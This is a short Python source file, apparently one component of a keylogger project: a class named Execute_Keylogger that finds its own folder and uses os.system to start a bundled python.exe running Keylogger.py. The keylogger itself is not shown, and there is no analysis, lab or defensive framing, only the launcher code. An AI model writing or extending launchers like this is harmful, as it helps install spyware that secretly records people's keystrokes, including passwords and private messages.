import os
class Execute_Keylogger():
	def __init__(self):
		self.Main()

	def Main(self):
		dirname = "\\".join(os.path.abspath(__file__).split("\\")[:-1])
		os.system('"' + dirname + '\\python.exe" "' + dirname + '\\Keylogger.py"')
